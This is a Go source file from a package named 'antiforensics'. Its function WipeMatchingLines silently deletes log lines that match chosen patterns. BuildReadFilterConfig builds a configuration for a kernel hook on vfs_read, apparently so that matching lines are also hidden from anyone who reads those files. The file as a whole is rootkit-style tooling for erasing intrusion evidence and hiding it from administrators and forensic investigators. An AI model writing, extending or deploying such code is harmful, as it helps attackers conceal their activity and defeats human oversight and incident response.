package antiforensics

import (
	"bufio"
	"os"
	"strings"
)

type LogFilter struct {
	Path     string
	Patterns []string
}

func (c *Controller) WipeMatchingLines(path string, patterns []string) (int, error) {
	f, err := os.Open(path)
	if err != nil {
		return 0, err
	}
	defer f.Close()

	var kept []string
	removed := 0
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := scanner.Text()
		if matchesAny(line, patterns) {
			removed++
			continue
		}
		kept = append(kept, line)
	}
	if err := scanner.Err(); err != nil {
		return 0, err
	}

	if removed == 0 {
		return 0, nil
	}

	return removed, os.WriteFile(path, []byte(strings.Join(kept, "\n")+"\n"), 0o644)
}

func (c *Controller) BuildReadFilterConfig() map[string]any {
	c.mu.Lock()
	defer c.mu.Unlock()

	entries := make([]map[string]any, 0, len(c.filterPaths))
	for path, patterns := range c.filterPaths {
		entries = append(entries, map[string]any{
			"path":     path,
			"patterns": patterns,
		})
	}

	return map[string]any{
		"hook_point":    "kretprobe/vfs_read",
		"filter_config": entries,
	}
}

func matchesAny(line string, patterns []string) bool {
	for _, p := range patterns {
		if strings.Contains(line, p) {
			return true
		}
	}
	return false
}
